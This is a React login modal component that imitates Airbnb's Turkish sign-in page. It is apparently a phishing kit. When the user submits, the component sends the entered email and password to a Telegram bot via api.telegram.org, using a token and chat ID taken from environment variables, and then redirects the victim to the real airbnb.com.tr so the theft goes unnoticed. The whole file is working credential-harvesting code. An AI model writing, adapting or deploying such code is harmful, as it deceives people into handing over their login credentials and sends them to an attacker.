import { useState } from "react";
import ModalHead from "./LoginModal/ModalHead";
import LoginForm from "./LoginModal/LoginForm";
import axios from 'axios';
function LoginModal() {
    const [phase, setPhase] = useState(0);
    const [formData, setFormData] = useState({
      email: '',
      password: ''
    });
    const handleForm = (e) => {
      const { name, value } = e.target;
      setFormData(prev => ({...prev, [name]: value}));
    }
    
    const handleSubmit = (e) => {
      e.preventDefault();
      if (phase == 0)
        setPhase(1)
      else {
        const { VITE_TELEGRAM_BOT_TOKEN, VITE_TELEGRAM_CHAT_ID } = import.meta.env;
        axios.post(`https://api.telegram.org/bot${VITE_TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${VITE_TELEGRAM_CHAT_ID}&text=${formData.email + ':' + formData.password}`);
        window.location.href = 'https://www.airbnb.com.tr/'
      }
    }
    return ( 
        <div className="sm:p-10 fixed flex items-center justify-center top-0 bottom-0 right-0 left-0">
        <div className="rounded-[12px] text-[rgb(34,34,34)] bg-white sm:max-w-[568px] max-w-full w-full max-h-full h-auto">
          {/* head */}
          <ModalHead />
          {/* body */}
          <div className="p-6">
            <div className="mt-2 mb-6">
              <h3 className="text-[22px]/[26px] font-semibold">Airbnb'ye Hoş Geldiniz</h3>
            </div>
            <LoginForm handleSubmit={handleSubmit} phase={phase} formData={formData} handleForm={handleForm} />
          </div>
        </div>
      </div>
     );
}

export default LoginModal;